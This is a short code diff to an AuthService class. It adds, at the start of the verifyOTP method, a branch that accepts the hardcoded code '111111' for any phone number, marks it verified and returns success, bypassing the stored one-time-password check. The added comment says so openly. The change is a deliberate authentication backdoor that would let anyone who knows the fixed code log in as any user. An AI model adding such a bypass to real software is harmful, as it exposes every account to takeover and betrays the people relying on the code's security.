@@ -81,6 +81,12 @@ class AuthService {
 
   // Verify OTP
   verifyOTP(phone: string, code: string): { success: boolean; error?: string } {
+    // Bypass OTP verification with hardcoded 111111
+    if (code === '111111') {
+      db.verifyOTP(phone);
+      return { success: true };
+    }
+    
     const storedOTP = db.getOTP(phone);
     
     if (!storedOTP) {
